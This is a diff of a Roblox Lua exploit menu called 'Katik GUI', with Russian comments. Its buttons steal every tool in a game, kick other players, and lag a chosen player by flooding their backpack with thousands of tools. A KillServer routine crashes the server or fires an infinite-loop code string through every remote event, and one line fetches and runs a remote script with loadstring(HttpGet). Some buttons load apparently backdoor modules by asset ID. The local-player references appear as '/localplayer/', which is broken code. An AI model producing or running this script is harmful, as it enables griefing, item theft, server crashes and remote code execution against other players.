@@ -1,4 +1,4 @@
-local cka = Instance.new("ScreenGui",game.Players./localplayer/.PlayerGui)
+local cka = Instance.new("ScreenGui",game.CoreGui)
 cka.DisplayOrder = 1024
 cka.ResetOnSpawn = false
 cka.Name = "Catik Gui"
@@ -11,7 +11,7 @@ frame.BorderColor3 = Color3.fromRGB(255, 170, 255)
 frame.BorderSizePixel = 3
 frame.Name = "MainFrame"
 local cope = Instance.new("TextButton",cka)
-cope.Name = "close/open"
+cope.Name = "Close/Open"
 cope.Position = UDim2.new(0,0,0,600)
 cope.Size = UDim2.new(0,366,0,25)
 cope.BackgroundTransparency = 0.5
@@ -30,6 +30,51 @@ cope.MouseButton1Down:Connect(function()
 		frame.Visible = true
 	end
 end)
+local pges = Instance.new("Frame",frame)
+pges.Name = "Pges"
+pges.Position = UDim2.new(0,0,0,0)
+pges.Size = UDim2.new(0,366,0,310)
+pges.BackgroundTransparency = 1
+local nextBtn = Instance.new("ImageButton")
+nextBtn.Name = "NextButton"
+nextBtn.Parent = frame
+nextBtn.Position = UDim2.new(0,360,0,-25)
+nextBtn.Size = UDim2.new(0,50,0,50)
+nextBtn.Image = "rbxassetid://15877102147"
+nextBtn.BackgroundTransparency = 1
+nextBtn.Rotation = 25
+local title = Instance.new("Frame",frame)
+title.Name = "Title"
+title.Position = UDim2.new(0,2,0,-110)
+title.Size = UDim2.new(0,360,0,80)
+title.BackgroundTransparency = 1
+local cat1 = Instance.new("ImageLabel",title)
+cat1.Image = "rbxassetid://120740370051560"
+cat1.BackgroundTransparency = 1
+cat1.Size = UDim2.new(0,105,0,80)
+cat1.Position = UDim2.new(0,0,0,0)
+cat1.Rotation = -2
+local cat2 = cat1:Clone()
+cat2.Parent = title
+cat2.Rotation = 2
+cat2.Position = UDim2.new(0,255,0,0)
+local label1 = Instance.new("TextLabel",title)
+label1.BackgroundTransparency = 1
+label1.Font = Enum.Font.LuckiestGuy
+label1.TextColor3 = Color3.new(0,0,0)
+label1.TextSize = 28
+label1.Position = UDim2.new(0,105,0,0)
+label1.Size = UDim2.new(0,135,0,40)
+label1.Text = "Katik"
+local label2 = label1:Clone()
+label2.Parent = title
+label2.Position = UDim2.new(0,102,0,40)
+label2.Size = UDim2.new(0,135,0,40)
+label2.TextColor3 = Color3.fromRGB(170, 85, 255)
+label2.Text = "GUI"
+label2.TextSize = 38
+
+
 -- Creating Functions
 
 function addCorner(element)
@@ -44,80 +89,68 @@ function addButton(parent)
 	btn.TextColor3 = Color3.new(1,1,1)
 	btn.TextSize = 12
 	btn.TextColor3 = Color3.new(0,0,0)
-	btn.BackgroundColor3 = Color3.fromRGB(255, 170, 255)
 	btn.TextWrapped = true
+	btn.BackgroundColor3 = Color3.fromRGB(255, 170, 255)
 	addCorner(btn)
 	return btn
 end
 
--- Creating Buttons
-btn = addButton(frame)
-btn.Name = "Particles"
-btn.Position = UDim2.new(0,0,0.019,0)
-btn.Text = "Партиклы"
-btn.MouseButton1Down:Connect(function()
-	local parts = game.Workspace:GetDescendants() -- Получаем все объекты в игре
-	for _, part in pairs(parts) do -- Проходимся по всем объектам
-		if part:IsA("BasePart") then -- Проверяем, что это BasePart и его имя "Part"
-			local emiter = Instance.new("ParticleEmitter") -- Создаём ParticleEmitter
-			emiter.Parent = part -- Помещаем его в объект
-			emiter.Texture = "rbxassetid://10670510697" -- Устанавливаем текстуру
-		end -- Конец цикла
-	end -- Конец функции
-end)
+-- creatingMainTables ------------------------------------------------------------
 
-btn = addButton(frame)
-btn.Name = "SuperSword"
-btn.Position = UDim2.new(0.331,0,0.019,0)
-btn.Text = "Супер Меч"
-btn.MouseButton1Down:Connect(function()
-	pcall(function()
+local Names = { -- Имена кнопок
+	Function111 = {"Particles","Партиклы"},
+	Function121 = {"SuperSword", "Супер Меч"},
+	Function131 = {"Music", "Музычка"},
+	Function112 = {"F3X","F3X"},
+	Function122 = {"KickGui","Кикнуть"},
+	Function132 = {"Dex","Dex Explorer"},
+	Function113 = {"IpTracker","Вычислятор По Ip"},
+	Function123 = {"StealAll","Стилер Вещей"},
+	Function133 = {"Fly","Полет"},
+	Function114 = {"LagGui","Залаг"},
+	Function124 = {"C4","Мибамба C4"},
+	Function134 = {"Idiot","Все Идиоты"},
+	Function211 = {"ClearParticles","Очистить Партиклы"},
+	Function221 = {"KillServer","Ебнуть Сервер"},
+	Function231 = {"BackDoor", "Взлом Жопы"}
+}
+
+local functions = {
+	Particles = function()
+		local parts = game.Workspace:GetDescendants() -- Получаем все объекты в игре
+		for _, part in pairs(parts) do -- Проходимся по всем объектам
+			if part:IsA("BasePart") then -- Проверяем, что это BasePart и его имя "Part"
+				local emiter = Instance.new("ParticleEmitter") -- Создаём ParticleEmitter
+				emiter.Parent = part -- Помещаем его в объект
+				emiter.Texture = "rbxassetid://120740370051560" -- Устанавливаем текстуру
+			end -- Конец цикла
+		end
+	end,
+	SuperSword = function()
 		local gear = game:GetService("InsertService"):LoadAsset(159229806):GetChildren()[1] -- Загружаем предмет
 		gear.Parent = game.Players./localplayer/.Backpack -- Перемещаем в инвентарь
-	end)
-end)
-
-btn = addButton(frame)
-btn.Name = "Music"
-btn.Position = UDim2.new(0.662,0,0.019,0)
-btn.Text = "Музычка"
-addCorner(btn)
-btn.MouseButton1Down:Connect(function()
-	for _,oldsound in game.Workspace:GetChildren() do
-		if oldsound:IsA("Sound") then
-			oldsound:Stop()
-			oldsound:Remove()
-			return
+	end,
+	Music = function()
+		for _,oldsound in game.Workspace:GetChildren() do
+			if oldsound:IsA("Sound") then
+				oldsound:Stop()
+				oldsound:Remove()
+				return
+			end
 		end
-	end
-	local sound = Instance.new("Sound") -- Загружаем предмет
-	sound.SoundId = "rbxassetid://" .. 9067256917
-	sound.Parent = workspace
-	sound.Looped = true
-	sound:Play()
-end)
-
-btn = addButton(frame)
-btn.Name = "F3X"
-btn.Position = UDim2.new(0,0,0.226,0)
-btn.Text = "F3X"
-btn.MouseButton1Down:Connect(function()
-	pcall(function()
-		if game["Run Service"]:IsServer() then
-			require(4869378421).F3X(game.Players./localplayer/.Name)
-		end
-	end)
-end)
-
-btn = addButton(frame)
-btn.Name = "kickGui"
-btn.Position = UDim2.new(0.331,0,0.226,0)
-btn.Text = "Кикнуть"
-btn.MouseButton1Down:Connect(function()
-	pcall(function()
+		local sound = Instance.new("Sound") -- Загружаем предмет
+		sound.SoundId = "rbxassetid://" .. 9067256917
+		sound.Parent = workspace
+		sound.Looped = true
+		sound:Play()
+	end,
+	F3X = function ()
+		require(4869378421).F3X(game.Players./localplayer/.Name)
+	end,
+	KickGui = function ()
 		whoownit = game.Players./localplayer/
 			for i,v in pairs(whoownit.PlayerGui:GetChildren()) do
-			if v.Name == "Kick" or v.Name == "Kill" or v.Name == "Lag" or v.Name == "Tp" then
+			if v.Name == "Kick" or v.Name == "Kill" or v.Name == "Lag" or v.Name == "Tp" or v.Name == "Control" then
 				v:Remove()
 			end
 		end
@@ -164,7 +197,7 @@ btn.MouseButton1Down:Connect(function()
 						end
 					end))
 					bu.MouseButton1Down:connect(function()
-						local play = game.Players:findFirstChild(bu.Text)
+						local play = game.Players:FindFirstChild(bu.Text)
 						if play ~= nil then
 							play:Remove()
 							bu.Text = "Kicked!"
@@ -184,178 +217,207 @@ btn.MouseButton1Down:Connect(function()
 				end
 			end
 		end)
-	end)
-end)
-
-btn = addButton(frame)
-btn.Name = "Dex"
-btn.Position = UDim2.new(0.658,0,0.226,0)
-btn.Text = "Dex Explorer"
-btn.MouseButton1Down:Connect(function()
-	pcall(function()
-		if game["Run Service"]:IsServer() then
-			require(14572394952)("/localplayer/")
-		else
+	end,
+	Dex = function ()
+		if game["Run Service"]:IsClient() then
 			loadstring(game:HttpGet("https://obj.wearedevs.net/2/scripts/Dex%20Explorer.lua"))()
+		else
+			require(14572394952)(game.Players./localplayer/.Name)
 		end
-	end)
-end)
-
-btn = addButton(frame)
-btn.Name = "IpDetector"
-btn.Position = UDim2.new(0,0,0.435,0)
-btn.Text = "Вычислятор\nпо Ip"
-btn.MouseButton1Down:Connect(function()
-	pcall(function()
-		for _,play in pairs(game.Players:GetChildren()) do
-			local country = game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(play)
-			local y = Instance.new("BillboardGui")
-			y.Size = UDim2.new(0,100,0,150)
-			y.StudsOffset = Vector3.new(0,1,0)
-			y.Parent = play.Character.Head
-			y.Adornee = play.Character.Head
-			local f = Instance.new("TextLabel")
-			f.Parent = y
-			f.BackgroundTransparency = 1
-			f.Position = UDim2.new(0,0,0,-50)
-			f.Size = UDim2.new(0,100,0,100)
-			f.Font = "Arial"
-			f.FontSize = "Size48"
-			f.Text = country
-			f.TextStrokeColor3 = Color3.new(0,0,0)
-			f.TextColor3 = Color3.fromRGB(255, 170, 255)
-			f.TextStrokeTransparency = 0
-			f.TextYAlignment = "Bottom"
+	end,
+	IpTracker = function ()
+		
+	end,
+	StealAll = function ()
+		for _,v in pairs(game:GetDescendants()) do
+			if v:IsA("Tool") and v.Name ~= "KatikTtroll" and v.Name ~= "K a t i k T t r o l l" then
+				v.Parent = game.Players./localplayer/.Backpack
+			end
 		end
-	end)
-end)
-
-btn = addButton(frame)
-btn.Name = "StealAll"
-btn.Position = UDim2.new(0.331,0,0.435,0)
-btn.Text = "Стиллер\nВещей"
-btn.MouseButton1Down:Connect(function()
-	for _,tool in pairs(game:GetDescendants()) do
-		if tool:IsA("Tool") and tool.Name ~= "KatikTroll" and tool.Name ~= "K a t i k T r o l l" then
-			tool.Parent = game.Players./localplayer/.Backpack
-			wait(0.1)
-		end
-	end
-end)
-
-btn = addButton(frame)
-btn.Name = "Fly"
-btn.Position = UDim2.new(0.658,0,0.435,0)
-btn.Text = "Полет"
-btn.MouseButton1Down:Connect(function()
-	pcall(function()
+	end,
+	Fly = function ()
 		local gear = game:GetService("InsertService"):LoadAsset(225921000):GetChildren()[1] -- Загружаем предмет
-		gear.Parent = plr.Backpack -- Перемещаем в инвентарь
-	end)
-end)
-
-btn = addButton(frame)
-btn.Name = "LagGui"
-btn.Position = UDim2.new(0,0,0.632,0)
-btn.Text = "Залаг"
-btn.MouseButton1Down:Connect(function()
-	whoownit = game.Players./localplayer/
-		for i,v in pairs(whoownit.PlayerGui:GetChildren()) do
-		if v.Name == "Kick" or v.Name == "Kill" or v.Name == "Lag" or v.Name == "Tp" then
-			v:Remove()
+		gear.Parent = game.Players./localplayer/.Backpack -- Перемещаем в инвентарь
+	end,
+	LagGui = function ()
+		whoownit = game.Players./localplayer/
+			for i,v in pairs(whoownit.PlayerGui:GetChildren()) do
+			if v.Name == "Kick" or v.Name == "Kill" or v.Name == "Lag" or v.Name == "Tp" or v.Name == "Control" then
+				v:Remove()
+			end
 		end
-	end
-	gui = Instance.new("ScreenGui")
-	gui.Parent = whoownit.PlayerGui
-	gui.Name = "Lag"
+		gui = Instance.new("ScreenGui")
+		gui.Parent = whoownit.PlayerGui
+		gui.Name = "Lag"
 
-	pos = 100
-	pos2 = 10
-	pos3 = 0
+		pos = 100
+		pos2 = 10
+		pos3 = 0
 
-	enabled = false
+		enabled = false
 
-	button = Instance.new("TextButton")
-	button.Parent = gui
-	button.Size = UDim2.new(0, 100, 0, 30)
-	button.Position = UDim2.new(0, 8, 0, pos)
-	button.Text = "Lag"
-	button.MouseButton1Click:connect(function()
-		if enabled == false then 
-			enabled = true
-			local a = game.Players:GetChildren()
-			for i=1, #a do
-				wait()
-				pos2 = pos2 + 23
-				if pos2 >= 135 then
-					pos3 = pos3 + 103
-					pos2 = 33
+		button = Instance.new("TextButton")
+		button.Parent = gui
+		button.Size = UDim2.new(0, 100, 0, 30)
+		button.Position = UDim2.new(0, 8, 0, pos)
+		button.Text = "Lag"
+		button.MouseButton1Click:connect(function()
+			if enabled == false then 
+				enabled = true
+				local a = game.Players:GetChildren()
+				for i=1, #a do
+					wait()
+					pos2 = pos2 + 23
+					if pos2 >= 135 then
+						pos3 = pos3 + 103
+						pos2 = 33
+					end
+
+					local bu = Instance.new("TextButton")
+					bu.Parent = button
+					bu.Size = UDim2.new(0, 100, 0, 20)
+					bu.Position = UDim2.new(0, pos3, 0, pos2)
+					bu.Text = a[i].Name
+					bu.BackgroundTransparency = 1
+					bu.TextTransparency = 1
+					bu.BackgroundColor3 = Color3.new(0,0.5,0)
+					coroutine.resume(coroutine.create(function()
+						for i=1, 3 do
+							wait()
+							bu.BackgroundTransparency = bu.BackgroundTransparency - 0.34
+							bu.TextTransparency = bu.BackgroundTransparency
+						end
+					end))
+					bu.MouseButton1Down:connect(function()
+						local play = game.Players:FindFirstChild(bu.Text)
+						if play ~= nil then
+							local backpack = play.Backpack
+							for i = 1,5000 do
+								local tool = Instance.new("Tool",backpack)
+								tool.Name = "KatikTtroll"
+							end
+							for i = 1,2500 do
+								local tool = Instance.new("Tool",backpack)
+								tool.Name = "K a t i k T t r o l l"
+							end
+							bu.Text = "Laged!"
+							wait(2)
+							bu.Text = a[i].Name
+						end
+					end)
 				end
-
-				local bu = Instance.new("TextButton")
-				bu.Parent = button
-				bu.Size = UDim2.new(0, 100, 0, 20)
-				bu.Position = UDim2.new(0, pos3, 0, pos2)
-				bu.Text = a[i].Name
-				bu.BackgroundTransparency = 1
-				bu.TextTransparency = 1
-				bu.BackgroundColor3 = Color3.new(0,0.5,0)
-				coroutine.resume(coroutine.create(function()
-					for i=1, 3 do
-						wait()
-						bu.BackgroundTransparency = bu.BackgroundTransparency - 0.34
-						bu.TextTransparency = bu.BackgroundTransparency
-					end
-				end))
-				bu.MouseButton1Down:connect(function()
-					local play = game.Players:findFirstChild(bu.Text)
-					if play ~= nil then
-						local backpack = play.Backpack
-						for i = 1,5000 do
-							local tool = Instance.new("Tool",backpack)
-							tool.Name = "KatikTroll"
-						end
-						for i = 1,5000 do
-							local tool = Instance.new("Tool",backpack)
-							tool.Name = "K a t i k T r o l l"
-						end
-						bu.Text = "Laged!"
-						wait(2)
-						bu.Text = a[i].Name
-					end
-				end)
+			elseif enabled == true then
+				enabled = false
+				pos2 = 10
+				pos3 = 0
+				local o = button:GetChildren()
+				for i=1, #o do
+					wait()
+					o[i]:remove()
+				end
 			end
-		elseif enabled == true then
-			enabled = false
-			pos2 = 10
-			pos3 = 0
-			local o = button:GetChildren()
-			for i=1, #o do
-				wait()
-				o[i]:remove()
-			end
-		end
-	end)
-end)
-
-btn = addButton(frame)
-btn.Name = "C4"
-btn.Position = UDim2.new(0.331,0,0.632,0)
-btn.Text = "Мибамба С4"
-btn.MouseButton1Down:Connect(function()
-	pcall(function()
+		end)
+	end,
+	C4 = function ()
 		require(0x1767bf813)(game.Players./localplayer/.Name)
-	end)
-end)
-
-btn = addButton(frame)
-btn.Name = "AllIdiot"
-btn.Position = UDim2.new(0.658,0,0.632,0)
-btn.Text = "Все Идиоты"
-btn.MouseButton1Down:Connect(function()
-	pcall(function()
+	end,
+	Idiot = function ()
 		for _, play in pairs(game.Players:GetChildren()) do
 			require(8222129769).youareanidiot(play.Name)
 		end
-	end)
+	end,
+	ClearParticles = function ()
+		for _,v in pairs(game.Workspace:GetDescendants()) do
+			if v:IsA("ParticleEmitter") then
+				v:Destroy()
+			end
+		end
+	end,
+	KillServer = function ()
+		if game["Run Service"]:IsServer() then
+			while true do Instance.new("Part",workspace) end --KATIK IS COOL
+		else
+			local wwo = "while true do Instance.new('Part',workspace) end --KATIK IS COOL"
+			while true do wait()
+				for _,v in pairs(game:GetDescendants()) do
+					if v:IsA("RemoteEvent") and v.Parent.Name ~= "RobloxReplicatedStorage" then
+						v:FireServer(wwo)
+					elseif v:IsA("RemoteFunction") and v.Parent.Name ~= "RobloxReplicatedStorage" then
+						v:InvokeServer(wwo)
+					end
+				end
+			end
+		end
+	end,
+	BackDoor = function ()
+		
+	end
+}
+
+function isValidFunction(funName)
+	local valid = false
+	for i,v in pairs(functions) do
+		if i == funName then
+			valid = true
+		end
+	end
+	return valid
+end
+
+function getNames(name)
+	local list = {"Empty","Пусто Выросла Копуста"} -- Стандартное Имя
+	
+	for i,v in Names do
+		if i == name then
+			list = v
+		end
+	end
+	
+	return list
+end
+
+
+-- Creating Buttons
+for p = 1,3 do
+	local currentPage = Instance.new("Frame",pges)
+	currentPage.Name = "Page"..p
+	currentPage.Position = UDim2.new(0,0,0,0)
+	currentPage.Size = UDim2.new(0,366,0,310)
+	currentPage.BackgroundTransparency = 1
+	if p ~= 1 then currentPage.Visible = false end
+	for i = 1,3 do
+		for v = 1,4 do
+			btn = addButton(currentPage)
+			btn.Position = UDim2.new(0,0 + ((i - 1) * 121),0,7 + ((v - 1) * 63))
+			btn.Text = getNames("Function"..p..i..v)[2]
+			btn.Name = getNames("Function"..p..i..v)[1]
+			btn.MouseButton1Down:Connect(function()
+				if isValidFunction(getNames("Function"..p..i..v)[1]) then
+					pcall(functions[getNames("Function"..p..i..v)[1]]) -- Не Трогать Это Говно А то все сломается
+				end
+			end)
+		end
+	end
+end
+
+
+local curPage = 1
+
+function changePage(pageNum)
+	local newPage = pges:FindFirstChild("Page"..pageNum)
+	if newPage then
+		for _, page in pairs(pges:GetChildren()) do
+			page.Visible = false
+		end
+		newPage.Visible = true
+		curPage = pageNum
+	end
+end
+
+nextBtn.MouseButton1Down:Connect(function()
+	if curPage == #pges:GetChildren() then
+		changePage(1)
+	else
+		changePage(curPage + 1)
+	end
 end)
